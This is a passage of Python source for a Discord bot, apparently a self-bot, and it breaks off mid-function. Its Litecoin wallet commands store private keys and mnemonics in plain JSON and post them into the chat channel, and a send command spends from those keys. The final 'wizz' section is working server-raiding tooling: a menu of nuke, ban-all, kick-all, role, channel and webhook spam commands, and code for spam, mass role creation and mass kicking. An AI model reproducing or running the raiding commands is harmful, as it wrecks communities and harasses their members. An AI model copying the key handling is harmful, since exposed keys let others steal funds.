            "<:TOS:1336669803221614622> **Mnemonic Code (Backup):**"
            f"```{mnemonic}```"
        )

        if webhook_message:
            await ctx.send(f"**Wallet saved internally and {webhook_message.jump_url}**.")

    @commands.command(aliases=["checkwallet"])
    async def walletinfo(self, ctx, wallet_name_or_id: str = None):
        await ctx.message.delete()

        if not os.path.exists("database/wallets.json"):
            return await senderror(ctx, "Error", "No wallets database found.")

        with open("database/wallets.json", "r") as f:
            wallets = json.load(f)

        if not wallets:
            return await senderror(ctx, "Error", "No wallets saved.")

        # ------------------------------
        # IF NO ARGUMENT → SHOW ALL
        # ------------------------------
        if wallet_name_or_id is None:

            message = "# __**ALL SAVED LTC WALLETS**__ <a:tz_ltc:1281238097136451616>\n\n"

            for wallet in wallets.values():
                message += (
                    f"**Wallet ID:** `{wallet['id']}`\n"
                    f"**Name:** `{wallet['wallet_name']}`\n"
                    f"**Address:** `{wallet['address']}`\n"
                    f"**Private Key:** `{wallet['private_key']}`\n\n"
                )

            return await ctx.send(message)

        # ------------------------------
        # IF ARGUMENT PROVIDED → SINGLE
        # ------------------------------
        identifier = wallet_name_or_id
        wallet_data = None

        if identifier.isdigit() and identifier in wallets:
            wallet_data = wallets[identifier]
        else:
            for data in wallets.values():
                if data["wallet_name"].lower() == identifier.lower():
                    wallet_data = data
                    break

        if not wallet_data:
            return await senderror(ctx, "Error", f"No wallet found for `{identifier}`.")

        confirmation_msg = await send(
            ctx,
            "LTC Wallet Details",
            f"**ID:** `{wallet_data['id']}`\n"
            f"**Name:** `{wallet_data['wallet_name']}`\n"
            f"**Address:** `{wallet_data['address']}`\n\n"
            "Are you sure you want to reveal the Private Key & Secret Phrases?\n"
            "Reply `Yes` to confirm, or `No` to cancel."
        )

        try:
            user_response = await self.bot.wait_for(
                "message",
                check=lambda m: m.author == ctx.author and m.channel == ctx.channel,
                timeout=30
            )

            try:
                await user_response.delete()
            except:
                pass

            if user_response.content.lower() in ["yes", "y"]:
                await confirmation_msg.delete()
                await send(
                    ctx,
                    "LTC Wallet Info 🔐",
                    f"**ID:** `{wallet_data['id']}`\n"
                    f"**Name:** `{wallet_data['wallet_name']}`\n"
                    f"**Address:** `{wallet_data['address']}`\n"
                    f"**Private Key:** `{wallet_data['private_key']}`\n"
                    f"**Secret Phrases:** `{wallet_data['mnemonic']}`"
                )
            else:
                await confirmation_msg.delete()
                await send(ctx, "Canceled ❌", "The action has been canceled.")

        except asyncio.TimeoutError:
            await confirmation_msg.delete()
            await send(ctx, "Timeout ⏰", "No response received. Action canceled.")
                        
    @commands.command(name="delwallet")
    async def delwallet(self, ctx, wallet_name_or_id: str):
        await ctx.message.delete()

        identifier = wallet_name_or_id

        if not os.path.exists("database/wallets.json"):
            return await senderror(ctx, "Error", "No wallets database found.")

        with open("database/wallets.json", "r") as f:
            wallets = json.load(f)

        wallet_key = None
        wallet_data = None

        if identifier.isdigit() and identifier in wallets:
            wallet_key = identifier
            wallet_data = wallets[identifier]
        else:
            for key, data in wallets.items():
                if data["wallet_name"].lower() == identifier.lower():
                    wallet_key = key
                    wallet_data = data
                    break

        if not wallet_data:
            return await senderror(ctx, "Error", f"No wallet found for `{identifier}`.")

        confirmation_msg = await send(
            ctx,
            "Delete Wallet ⚠️",
            f"**ID:** `{wallet_data['id']}`\n"
            f"**Name:** `{wallet_data['wallet_name']}`\n\n"
            "Reply `Yes` to permanently delete this wallet."
        )

        try:
            response = await self.bot.wait_for(
                "message",
                check=lambda m: m.author == ctx.author and m.channel == ctx.channel,
                timeout=30
            )

            await response.delete()

            if response.content.lower() in ["yes", "y"]:
                wallets.pop(wallet_key)

                with open("database/wallets.json", "w") as f:
                    json.dump(wallets, f, indent=4)

                await confirmation_msg.delete()
                await send(ctx, "Wallet Deleted ✅", f"Wallet `{wallet_data['wallet_name']}` removed successfully.")
            else:
                await confirmation_msg.delete()
                await send(ctx, "Canceled ❌", "Deletion canceled.")

        except asyncio.TimeoutError:
            await confirmation_msg.delete()
            await send(ctx, "Timeout ⏰", "No response received. Action canceled.")
            
    @commands.command(name="importwallet")
    async def importwallet(self, ctx, wallet_name: str, private_key: str):
        """
        Import an existing private key (WIF or raw hex). Auto-detects network (mainnet/testnet),
        derives an address, saves it to database/wallets.json and prints UI like genltc.
        """
        await ctx.message.delete()

        # Sanitize input (trim spaces and invisible characters)
        raw_key = private_key.strip().replace("\u200b", "").replace("\ufeff", "")

        priv_hex = None
        derived_address = None
        used_network = None

        # Try bitcoinlib first (auto-detect). If present and works, use it.
        try:
            from bitcoinlib.keys import Key
            try:
                k = Key(import_key=raw_key)  # let bitcoinlib auto-detect
                derived_address = k.address()
                # bitcoinlib exposes network name sometimes; fall back to None if not present
                used_network = getattr(k, "network", None)
            except Exception:
                # move to fallback
                pass
        except Exception:
            # bitcoinlib not installed — use fallback
            pass

        # If bitcoinlib failed, fallback to manual decode
        if derived_address is None:
            import binascii
            import hashlib
            import json
            import os

            # ---- base58 helpers ----
            ALPHABET = "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz"

            def b58decode(s: str) -> bytes:
                n = 0
                for ch in s:
                    n = n * 58 + ALPHABET.index(ch)
                full = n.to_bytes((n.bit_length() + 7) // 8, 'big')
                # add leading zeros
                zeros = len(s) - len(s.lstrip('1'))
                return b'\x00' * zeros + full

            def b58encode(b: bytes) -> str:
                # encode bytes to base58 (no checksum)
                n = int.from_bytes(b, 'big')
                res = ""
                while n > 0:
                    n, r = divmod(n, 58)
                    res = ALPHABET[r] + res
                # leading zeros
                leading = 0
                for c in b:
                    if c == 0:
                        leading += 1
                    else:
                        break
                return '1' * leading + res

            def base58check_decode(s: str) -> bytes:
                decoded = b58decode(s)
                if len(decoded) < 4:
                    raise ValueError("Invalid base58")
                payload, check = decoded[:-4], decoded[-4:]
                hashed = hashlib.sha256(hashlib.sha256(payload).digest()).digest()[:4]
                if hashed != check:
                    raise ValueError("Invalid checksum")
                return payload  # version + data

            def base58check_encode(payload: bytes) -> str:
                chk = hashlib.sha256(hashlib.sha256(payload).digest()).digest()[:4]
                return b58encode(payload + chk)

            # ---- WIF handling ----
            try:
                # Try interpret as base58 WIF first
                payload = base58check_decode(raw_key)
                # payload = version_byte + keybytes [+ 0x01 if compressed]
                version = payload[0]
                key_and_flag = payload[1:]
                if len(key_and_flag) == 33 and key_and_flag[-1] == 0x01:
                    priv_bytes = key_and_flag[:-1]
                    compressed = True
                elif len(key_and_flag) == 32:
                    priv_bytes = key_and_flag
                    compressed = False
                else:
                    raise ValueError("Unexpected WIF payload length")
                priv_hex = binascii.hexlify(priv_bytes).decode()
                # detect network by version byte
                # Common mappings:
                # 0x80 -> Bitcoin mainnet WIF
                # 0xEF -> Bitcoin/Litecoin testnet WIF
                # 0xB0 -> Litecoin mainnet WIF (historical)
                if version == 0xB0:
                    used_network = "litecoin_mainnet"
                elif version == 0x80:
                    used_network = "bitcoin_mainnet"
                elif version == 0xEF:
                    used_network = "testnet"
                else:
                    # unknown version: we'll still proceed but mark unknown
                    used_network = f"version_0x{version:02x}"
            except Exception:
                # Not valid base58 WIF — try raw hex
                try:
                    # allow hex with or without 0x
                    hk = raw_key.lower()
                    if hk.startswith("0x"):
                        hk = hk[2:]
                    if len(hk) == 64 and all(c in "0123456789abcdef" for c in hk):
                        priv_hex = hk
                        compressed = True  # assume compressed by default
                        used_network = None
                    else:
                        raise ValueError("Not a raw hex private key")
                except Exception:
                    return await senderror(ctx, "Error", "Invalid or unsupported private key. Make sure it's WIF or 64-char hex.")

            # ---- derive public key from priv_bytes ----
            try:
                import ecdsa
                priv_bytes = binascii.unhexlify(priv_hex)
                sk = ecdsa.SigningKey.from_string(priv_bytes, curve=ecdsa.SECP256k1)
                vk = sk.get_verifying_key()
                px = vk.to_string()[:32]
                py = vk.to_string()[32:]

                x = int.from_bytes(px, 'big')
                y = int.from_bytes(py, 'big')

                if compressed:
                    prefix = b'\x02' if (y % 2 == 0) else b'\x03'
                    pubkey = prefix + px
                else:
                    pubkey = b'\x04' + px + py

                # hash160 = ripemd160(sha256(pubkey))
                sha = hashlib.sha256(pubkey).digest()
                try:
                    ripemd = hashlib.new('ripemd160')
                except Exception:
                    return await senderror(ctx, "Error", "ripemd160 not available in hashlib on this environment.")
                ripemd.update(sha)
                h160 = ripemd.digest()

                # Candidate version bytes for legacy P2PKH: try Litecoin mainnet (0x30), Bitcoin mainnet (0x00), testnet (0x6f)
                candidates = []
                # prefer mapping from detected WIF version
                if used_network == "litecoin_mainnet":
                    candidates = [0x30, 0x00, 0x6f]
                elif used_network == "bitcoin_mainnet":
                    candidates = [0x00, 0x30, 0x6f]
                elif used_network == "testnet":
                    candidates = [0x6f, 0x30, 0x00]
                else:
                    candidates = [0x30, 0x00, 0x6f]

                # build first plausible address and choose the one matching preferences
                chosen_address = None
                chosen_version = None
                for ver in candidates:
                    payload_addr = bytes([ver]) + h160
                    addr = base58check_encode(payload_addr)
                    # pick first candidate (ordered by preference)
                    chosen_address = addr
                    chosen_version = ver
                    break

                derived_address = chosen_address
            except Exception as e:
                return await senderror(ctx, "Error", f"Failed deriving address: {str(e)}")

        # ---- Save to database ----
        try:
            os.makedirs("database", exist_ok=True)
            wallet_file = "database/wallets.json"
            if os.path.exists(wallet_file):
                with open(wallet_file, "r") as f:
                    wallets = json.load(f)
            else:
                wallets = {}

            wallet_id = str(max([int(i) for i in wallets.keys()], default=0) + 1)

            wallets[wallet_id] = {
                "id": int(wallet_id),
                "wallet_name": wallet_name,
                "mnemonic": None,
                "xpub": None,
                "address": derived_address,
                "private_key": raw_key
            }

            with open(wallet_file, "w") as f:
                json.dump(wallets, f, indent=4)
        except Exception as e:
            return await senderror(ctx, "Error", f"Failed saving wallet: {str(e)}")

        # ---- Output UI (match genltc style) ----
        await send(
            ctx,
            "# __**LTC WALLET IMPORTED**__ <a:tz_ltc:1281238097136451616>\n"
            "<:white_Arrow:1290693791983861822> **Store the private key safely & securely !** <a:check:1281246680724930683>\n\n"
            f"**<:bxbz_monet_lovenote:1290693793724497920> Wallet Name: `{wallet_name}`**\n"
            f"**Wallet ID:** `Wallet {wallet_id}`\n\n"
            "<a:tz_ltc:1281238097136451616> **Address:**\n"
            f"`{derived_address}`\n\n"
            "<:emoji_1738342244745:1334928872269152259> **Private Key:**\n"
            f"||{raw_key}||\n\n"
            "<:TOS:1336669803221614622> **Mnemonic Code (Backup):**"
            "```Not Available (Imported Wallet)```"
        )
        
    @commands.command(name="pay")
    async def pay(self, ctx, amount_usd: str, to_address: str, wallet_id: str):
        try:
            await ctx.message.delete()
        except:
            pass

        with open("database/wallets.json", "r") as f:
            wallets = json.load(f)

        with open("config.json", "r") as f:
            config = json.load(f)

        tatum_api_key = config.get("tatum_api_key")
        wallet_data = wallets.get(wallet_id)

        if not wallet_data:
            return await senderror(ctx, "Wallet Error", f"No wallet found with key `{wallet_id}`.")

        # ✅ FIXED AMOUNT PARSING (no regex, safe)
        try:
            amount_usd = str(amount_usd).strip().replace(",", "")

            if not amount_usd:
                raise ValueError

            amount_usd = float(amount_usd)

            if amount_usd <= 0:
                return await senderror(ctx, "Invalid Amount", "USD amount must be greater than 0.")

        except:
            return await senderror(ctx, "Invalid Amount", "Enter a valid number for USD.")

        async with aiohttp.ClientSession() as session:
            async with session.get("https://min-api.cryptocompare.com/data/price?fsym=LTC&tsyms=USD") as res:
                if res.status != 200:
                    return await senderror(ctx, "Error", "Failed to fetch LTC price.")
                data = await res.json()
                ltc_price = data.get("USD")

        if not ltc_price:
            return await senderror(ctx, "Error", "Could not retrieve LTC price.")

        try:
            ltc_price = float(ltc_price)
        except:
            return await senderror(ctx, "Error", "Invalid LTC price received.")

        ltc_raw = amount_usd / ltc_price
        ltc_str = f"{ltc_raw:.8f}"
        ltc_amount = float(ltc_str)

        if ltc_amount <= 0:
            return await senderror(ctx, "Invalid Amount", "Amount too small after conversion.")

        sender_address = wallet_data["address"]
        private_key = wallet_data["private_key"]

        confirmation = await send(
            ctx,
            "LTC Pay Confirmation <a:check:1281246680724930683>",
            f"**Amount:** {amount_usd:.2f} $ | {ltc_str} LTC\n\n"
            f"**Sender's Address:**\n`{sender_address}`\n\n"
            f"**Receiver's Address:**\n`{to_address}`\n\n"
            "**`Send yes/y to confirm the payment`**\n"
            "**`Send no/n to cancel`**"
        )

        await asyncio.sleep(0.5)

        try:
            msg = await self.bot.wait_for(
                "message",
                timeout=30,
                check=lambda m: (
                    m.author.id == ctx.author.id and
                    m.channel.id == ctx.channel.id
                )
            )

            try:
                await msg.delete()
            except:
                pass

            content = msg.content.lower().strip()

            if content in ["yes", "y"]:
                await confirmation.delete()

                processing_msg = await send(
                    ctx,
                    "Processing Payment",
                    "<a:SA_CH_IconLoading:1475035848796803092> Processing..."
                )

                payload = {
                    "fromAddress": [{
                        "address": sender_address,
                        "privateKey": private_key
                    }],
                    "to": [{
                        "address": to_address,
                        "value": float(ltc_amount)
                    }],
                    "fee": "0.0001",
                    "changeAddress": sender_address
                }

                headers = {
                    "x-api-key": tatum_api_key,
                    "Content-Type": "application/json"
                }

                async with aiohttp.ClientSession() as session:
                    async with session.post(
                        "https://api.tatum.io/v3/litecoin/transaction",
                        json=payload,
                        headers=headers
                    ) as r:

                        res = await r.json()

                        try:
                            await processing_msg.delete()
                        except:
                            pass

                        if r.status == 200 and "txId" in res:
                            txid = res["txId"]
                            return await send(
                                ctx,
                                "LTC Sent <:emoji_1738342244745:1334928872269152259>",
                                f"**Amount:** {amount_usd:.2f} $ | {ltc_str} LTC\n\n"
                                f"**Sender:** `{sender_address}`\n"
                                f"**Receiver:** `{to_address}`\n\n"
                                f"**[Transaction ID](https://litecoinspace.org/tx/{txid})**"
                            )
                        else:
                            return await senderror(
                                ctx,
                                "Tatum Error",
                                f"Failed to send LTC.\n```{str(res)}```"
                            )

            elif content in ["no", "n"]:
                await confirmation.delete()
                return await senderror(ctx, "Canceled", "The payment has been canceled.")

            else:
                await confirmation.delete()
                return await senderror(ctx, "Invalid Input", "You must reply with `yes` or `no`.")

        except asyncio.TimeoutError:
            await confirmation.delete()
            return await senderror(ctx, "Timeout", "You took too long to respond. Action canceled.")
            
    @commands.command(aliases=['ltcbal', 'checkbal', 'getbal', 'balance', 'mybal'])
    async def bal(self, ctx, input: str = None):
        if not input:
            return await senderror(ctx, "Error", "Please provide a wallet ID or address or use \"all\" for all wallets.")
        await ctx.message.delete()

        # Load wallets
        with open("database/wallets.json", "r") as f:
            wallets = json.load(f)

        async with aiohttp.ClientSession() as session:
            # Fetch USD price of LTC
            async with session.get("https://api.coingecko.com/api/v3/simple/price?ids=litecoin&vs_currencies=usd") as cg_response:
                if cg_response.status != 200:
                    return await ctx.send("Failed to fetch USD conversion rate.")
                usd_price = (await cg_response.json())['litecoin']['usd']

            # If input is "all"
            if input == "all":
                response = ""
                for wallet_id, wallet_info in wallets.items():
                    address = wallet_info["address"]
                    balance_data = await self.fetch_balance_data(session, address)
                    if not balance_data:
                        continue
                    ltc_bal = balance_data['balance'] / 1e8
                    usd_bal = ltc_bal * usd_price
                    response += f"{address}\n- <:white_arrow:1290693789824061461> **Wallet ID:** {wallet_id}\n- <:white_arrow:1290693789824061461> **Balance:** {usd_bal:.2f} $ | {ltc_bal:.8f}\n\n"
                return await send(ctx,"LTC Balance",response or "No wallets found.")

            # If input is a raw LTC address
            if input and (input.startswith("ltc1") or input.startswith("L")) or input.startswith("M") or input.startswith("3"):
                address = input
                wallet_id = "None"
            else:
                # It's a wallet ID
                wallet_info = wallets.get(input)
                if not wallet_info:
                    return await ctx.send("Wallet ID not found.")
                address = wallet_info["address"]
                wallet_id = input

            balance_data = await self.fetch_balance_data(session, address)
            if not balance_data:
                return await ctx.send("Failed to retrieve wallet info.")

            ltc_bal = balance_data['balance'] / 1e8
            total_rec = balance_data['total_received'] / 1e8
            unconf = balance_data['unconfirmed_balance'] / 1e8

            usd_bal = ltc_bal * usd_price
            usd_total = total_rec * usd_price
            usd_unconf = unconf * usd_price

            msg = (
                f"{address}\n"
                f"- <:white_arrow:1290693789824061461> **Wallet ID:** {wallet_id}\n"
                f"- <:white_arrow:1290693789824061461> **Balance:** {usd_bal:.2f} $ | {ltc_bal:.8f}\n"
                f"- <:white_arrow:1290693789824061461> **Unconfirmed:** {usd_unconf:.2f} $ | {unconf:.8f}\n"
                f"- <:white_arrow:1290693789824061461> **Total Recvd:** {usd_total:.2f} $ | {total_rec:.8f}"
            )
            await send(ctx,"LTC Balance",msg)

    async def fetch_balance_data(self, session, address):
        try:
            async with session.get(f"https://api.blockcypher.com/v1/ltc/main/addrs/{address}/balance") as resp:
                if resp.status != 200:
                    return None
                return await resp.json()
        except:
            return None


    @commands.command()
    async def addy(self,ctx,wallet_id):
        await ctx.message.delete()  
        with open('database/wallets.json', 'r') as wallets_file:
            wallets = json.load(wallets_file) 
        wallet_data = wallets.get(wallet_id)
        if not wallet_data:
            return await senderror(ctx, "Error", f"No wallet found with ID `{wallet_id}`.")
        address = wallet_data["address"]
        await send(ctx, "LTC Address", f"<:white_arrow:1290693789824061461> **Address:** `{address}`\n<:white_arrow:1290693789824061461> **Wallet ID:** `{wallet_id}`")
        await ctx.send(address)       

    @commands.command()
    async def l2u(self,ctx,amount : str):
        await ctx.message.delete()
        try:
            amount = float(amount)
        except ValueError:
            return await senderror(ctx, "Error", "Please enter a valid number.")
        async with aiohttp.ClientSession() as session:
            async with session.get("https://api.coingecko.com/api/v3/simple/price?ids=litecoin&vs_currencies=usd") as cg_response:
                if cg_response.status != 200:
                    return await ctx.send("Failed to fetch USD conversion rate.")
                usd_price = (await cg_response.json())['litecoin']['usd']
        amount_in_usd = amount * usd_price
        await send(ctx, "Litecoin to USD", f"<a:tz_ltc:1281238097136451616> Amount in LTC: {amount} LTC\n<:dollar:1322965559134126214> Amount in USD: {amount_in_usd:.2f} $")

    @commands.command()
    async def u2l(self,ctx,amount : str):
        await ctx.message.delete()
        try:
            amount = float(amount)
        except ValueError:
            return await senderror(ctx, "Error", "Please enter a valid number.")
        async with aiohttp.ClientSession() as session:
            async with session.get("https://api.coingecko.com/api/v3/simple/price?ids=litecoin&vs_currencies=usd") as cg_response:
                if cg_response.status != 200:
                    return await ctx.send("Failed to fetch USD conversion rate.")
                usd_price = (await cg_response.json())['litecoin']['usd']
        amount_in_ltc = amount / usd_price
        await send(ctx, "USD to Litecoin", f"<:dollar:1322965559134126214> Amount in USD: {amount} $\n<a:tz_ltc:1281238097136451616> Amount in LTC: {amount_in_ltc:.8f} LTC")

    @commands.command(aliases=['i2u'])
    async def i2c(self, ctx, amount: str):
        await ctx.message.delete()

        try:
            with open('config.json', 'r') as f:
                config = json.load(f)

            rate = float(config.get('I2C_Rate', 100))  # default 100

            if '$' in amount:
                usd = float(amount.replace('$', '').strip())
                inr = round(usd * rate, 2)

                response = (
                    f"# **__INR TO CRYPTO__** <:exch:1322953996389974048>\n"
                    f"> <:jrexchanger:1322956674465792151> **EXCHANGE RATE :** `{rate}/$`\n"
                    f"> <:exchanger:1322954180452810775> **USD AMOUNT :** `${usd:.2f}`\n"
                    f"> <:INR:1322635698435784775> **INR AMOUNT :** `₹{inr}`"
                )

            else:
                inr = float(amount.replace('₹', '').strip())
                usd = round(inr / rate, 2)

                response = (
                    f"# **__INR TO CRYPTO__** <:exch:1322953996389974048>\n"
                    f"> <:jrexchanger:1322956674465792151> **EXCHANGE RATE :** `{rate}/$`\n"
                    f"> <:INR:1322635698435784775> **INR AMOUNT :** `₹{inr}`\n"
                    f"> <:exchanger:1322954180452810775> **CRYPTO AMOUNT :** `${usd:.2f}`"
                )

            await send(ctx, ".", response)

        except ValueError:
            await senderror(ctx, "Error", "Invalid amount! Enter a valid number.")
        except Exception as e:
            await senderror(ctx, "Error", f"{str(e)}")
            
    @commands.command(aliases=['u2i'])
    async def c2i(self, ctx, amount: str):
        await ctx.message.delete()

        try:
            with open('config.json', 'r') as f:
                config = json.load(f)

            rate = float(config.get('C2I_Rate', 97))  # default 97

            if '$' in amount:
                usd = float(amount.replace('$', '').strip())
                inr = round(usd * rate, 2)

                response = (
                    f"# **__CRYPTO TO INR__** <:exch:1322953996389974048>\n"
                    f"> <:jrexchanger:1322956674465792151> **EXCHANGE RATE :** `{rate}/$`\n"
                    f"> <:exchanger:1322954180452810775> **CRYPTO AMOUNT :** `${usd:.2f}`\n"
                    f"> <:INR:1322635698435784775> **INR AMOUNT :** `₹{inr}`"
                )

            else:
                inr = float(amount.replace('₹', '').strip())
                usd = round(inr / rate, 2)

                response = (
                    f"# **__CRYPTO TO INR__** <:exch:1322953996389974048>\n"
                    f"> <:jrexchanger:1322956674465792151> **EXCHANGE RATE :** `{rate}/$`\n"
                    f"> <:INR:1322635698435784775> **INR AMOUNT :** `₹{inr}`\n"
                    f"> <:exchanger:1322954180452810775> **CRYPTO AMOUNT :** `${usd:.2f}`"
                )

            await send(ctx, ".", response)

        except ValueError:
            await senderror(ctx, "Error", "Invalid amount! Enter a valid number.")
        except Exception as e:
            await senderror(ctx, "Error", f"{str(e)}")
            
    @commands.command(name="setrate")
    async def setrate(self, ctx, rate_type: str, value: str):
        await ctx.message.delete()

        try:
            rate_type = str(rate_type).lower().strip()

            # 🔒 sanitize input (THIS is what fixes .so issues)
            value_clean = str(value).strip().replace(",", "")

            # optional: remove junk like $ or spaces
            import re
            value_clean = re.sub(r"[^\d.]", "", value_clean)

            value_float = float(value_clean)

            if value_float <= 0:
                return await senderror(ctx, "Error", "Rate must be greater than 0.")

            # Load config
            with open('config.json', 'r') as f:
                config = json.load(f)

            # Store as float (correct for calculations)
            if rate_type == "i2c":
                config["I2C_Rate"] = value_float
            elif rate_type == "c2i":
                config["C2I_Rate"] = value_float
            else:
                return await senderror(ctx, "Error", "Use `i2c` or `c2i`.")

            # Save config
            with open('config.json', 'w') as f:
                json.dump(config, f, indent=4)

            # 🔒 ALWAYS use string for output
            value_str = f"{value_float:.2f}"

            await send(
                ctx,
                "Rate Updated",
                f"**{rate_type.upper()} rate set to `{value_str}`**"
            )

        except ValueError:
            await senderror(ctx, "Error", "Enter a valid number (e.g. 98 or 98.5).")
        except Exception as e:
            await senderror(ctx, "Error", str(e))
                        
    @commands.command(aliases=['c2e'])
    async def u2e(self, ctx, amount: str):
        await ctx.message.delete()
        usd_to_eur_rate = self.get_usd_to_eur_rate()
        if usd_to_eur_rate is None:
            await senderror(ctx, "Error", "Error fetching conversion rate, try again later")
            return
        amount_in_usd = float(amount)
        amount_in_eur = amount_in_usd * usd_to_eur_rate
        await send(ctx, "USD to EUR", f"<:dollar:1322965559134126214> Amount in USD: {amount} $\n<:u_:1475035383535239292> Amount in EUR: {amount_in_eur:.2f} €")

    @commands.command(aliases=['e2c'])
    async def e2u(self, ctx, amount: str):
        await ctx.message.delete()
        usd_to_eur_rate = self.get_usd_to_eur_rate()
        if usd_to_eur_rate is None:
            await senderror(ctx, "Error", "Error fetching conversion rate, try again later")
            return
        amount_in_eur = float(amount)
        amount_in_usd = amount_in_eur / usd_to_eur_rate
        await send(ctx, "EUR to USD", f"<:u_:1475035383535239292> Amount in EUR: {amount} €\n<:dollar:1322965559134126214> Amount in USD: {amount_in_usd:.2f} $")

    @commands.command(aliases=['ltcqr'])
    async def ltcqrcode(self, ctx,wallet_id):
        await ctx.message.delete()
        with open('database/wallets.json', 'r') as wallets_file:
            wallets = json.load(wallets_file) 
        wallet_data = wallets.get(wallet_id)
        if not wallet_data:
            return await senderror(ctx, "Error", f"No wallet found with ID `{wallet_id}`.")
        self.LTC_ADDRESS = wallet_data["address"]
        addy = self.LTC_ADDRESS
        try:
            qr = qrcode.QRCode(
                version=1,
                box_size=10, 
                border=5,
            )
            qr.add_data(addy)
            qr.make(fit=True)
            img = qr.make_image(fill="black", back_color="white")
            buffer = BytesIO()
            img.save(buffer, format="PNG")
            buffer.seek(0)
            file = discord.File(buffer, filename="ltc_qr.png")
            await ctx.send(content=f"> **Here is the QR code for your LTC address**\n> ```{addy}```", file=file)
        except Exception as e:
            await ctx.send(f"An error occurred while generating the QR code: {e}")

    @commands.command(aliases=['upiqr'])
    async def upiqrcode(self, ctx,slot_number_or_all,amount : int):
        arg = slot_number_or_all
        await ctx.message.delete()
        try:
            with open("database/upi.json", "r") as f:
                data = json.load(f)
        except FileNotFoundError:
            return await senderror(ctx, "Error", "No UPI IDs have been set. Use `!setupi <slot_number> <upi_id>` to set one.")
        slot_number = str(arg)
        slot_data = data.get(slot_number)
        if not slot_data:
            return await senderror(ctx, "Error", f"No UPI ID found for slot `{slot_number}`. Set one using `!setupi {slot_number} <upi_id>`.")
        upi_id = slot_data.get("upi_id")
        if not upi_id:
            return await senderror(ctx, "Error", f"UPI ID for slot `{slot_number}` is missing or invalid.")
        self.upi = upi_id
        upi = f"upi://pay?pa={self.upi}&pn=Unknown&tn=I authorise this Payment&am={amount}&cu=INR"
        try:
            qr = qrcode.QRCode(
                version=1,
                box_size=10, 
                border=5,
            )
            qr.add_data(upi)
            qr.make(fit=True)
            img = qr.make_image(fill="black", back_color="white")
            buffer = BytesIO()
            img.save(buffer, format="PNG")
            buffer.seek(0)
            file = discord.File(buffer, filename="ltc_qr.png")
            await ctx.send(content=f"<:white_arrow:1290693789824061461> **Here is the QR code for your UPI Id**\n> **`{self.upi}` with amount `{amount}`**", file=file)
        except Exception as e:
            await ctx.send(f"An error occurred while generating the QR code: {e}")

class wizz(commands.Cog):
    def __init__(self, bot):
        self.bot = bot
        self.api_base_url = "https://discord.com/api/v9"        
        self.webhooks = {}
        
    @commands.command()
    async def wizz(self, ctx):
        with open('config.json', 'r') as config_file:
            config = json.load(config_file)
        prefix = config.get("prefix")
        await ctx.message.delete()
        content = (
            f"<:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095>\n"
            f"<:BadgeDeveloper:1290693804013129768> **`[REQUIRED] | <OPTIONAL>`** <a:Bot:1336670517486161951>\n"
            f"<:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095>\n"            
            f"<a:Nuking_Residence:1308833239670198314> | **Full Nukez** **:** **`{prefix}kill`**\n"                    
            f"<a:Nuking_Residence:1308833239670198314> | **Spam Roles (100)** **:** **`{prefix}massrole [name]`**\n"
            f"<a:Nuking_Residence:1308833239670198314> | **Bans all users** **:** **`{prefix}banall`**\n"
            f"<a:Nuking_Residence:1308833239670198314> | **Kicks all users** **:** **`{prefix}kickall`**\n"
            f"<a:Nuking_Residence:1308833239670198314> | **Spam Text Channels** **:** **`{prefix}massch [name]`**\n"
            f"<a:Nuking_Residence:1308833239670198314> | **Spam Voice channels** **:** **`{prefix}massvc [name]`**\n"
            f"<a:Nuking_Residence:1308833239670198314> | **Deletes all roles** **:** **`{prefix}delroles`**\n"
            f"<a:Nuking_Residence:1308833239670198314> | **Deletes all channels** **:** **`{prefix}delchannels`**\n"
            f"<a:Nuking_Residence:1308833239670198314> | **Spam message** **:** **`{prefix}spam [times] [message]`**\n"
            f"<a:Nuking_Residence:1308833239670198314> | **Spam mass GC** **:** **`{prefix}gcspam [userID] [count]`**\n"
            f"<a:Nuking_Residence:1308833239670198314> | **Webhook spam** **:** **`{prefix}webspam [URL] [count] [msg]`**\n"
            f"<a:Nuking_Residence:1308833239670198314> | **Delete webhook** **:** **`{prefix}webdel [URL]`**\n"
            f"<a:Nuking_Residence:1308833239670198314> | **Nick all users** **:** **`{prefix}nickall [name]`**\n"             
            f"<:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095>"           
            )
        await send(ctx, "<:devs:1290693770567749652>__Wizz Commands__<:Titanz:1281243489635405827>", content,"USE ON YOUR OWN RISK")

    @commands.command()
    async def spam(self,ctx, times: int, *, message):
        await ctx.message.delete()
        for _ in range(times):
            await ctx.send(message) 

    @commands.command(name="massrole",aliases=['massroles','massr','spamroles','spamrole','spamr'])
    async def massrole(self, ctx, name: str):
        await ctx.message.delete()
        guild = ctx.guild
        for i in range(100):
            await guild.create_role(name=name)

    @commands.command(name="kickall", aliases=['kickwave'])
    async def kickall(self, ctx):
        await ctx.message.delete()
        guild = ctx.guild
        author_id = ctx.author.id
        bot_id = self.bot.user.id
        members = await guild.fetch_members()
        for member in members:
            if member.id in [author_id, bot_id]:  # Don't kick yourself or the bot
                continue
            try:
                await member.kick(reason="masskick HAHA")
            except Exception as e:
                print(f"Error kicking {member}: {e}")

        await ctx.send("<:white_arrow:1290693789824061461> Kicked all members from the server.")

    @commands.command(aliases=['massban','banwave'])
    async def banall(self, ctx):
        await ctx.message.delete()
        guild = ctx.guild
        author_id = ctx.author.id
        bot_id = self.bot.user.id
